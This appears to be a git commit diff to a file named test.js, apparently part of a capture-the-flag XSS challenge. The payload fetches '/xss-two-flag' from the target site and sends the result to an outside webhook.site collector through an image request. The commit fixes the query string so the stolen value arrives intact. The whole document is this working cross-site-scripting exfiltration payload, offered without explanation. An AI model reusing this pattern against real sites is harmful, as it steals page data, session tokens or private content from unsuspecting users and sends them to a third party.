b6fb30dd89eaef6f618ec2a1820497f54b829b07
Un1ike <130181025+Un1ike@users.noreply.github.com>
2026-03-22 02:37:37 -1000

    Update test.js

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 fetch('/xss-two-flag')
   .then(r => r.text())
   .then(flag => {
-    new Image().src = 'https://webhook.site/df3cbd5e-ca31-4457-b8ff-ac4735fe041c' + encodeURIComponent(flag);
+    new Image().src = 'https://webhook.site/df3cbd5e-ca31-4457-b8ff-ac4735fe041c?d=' + encodeURIComponent(flag);
   });
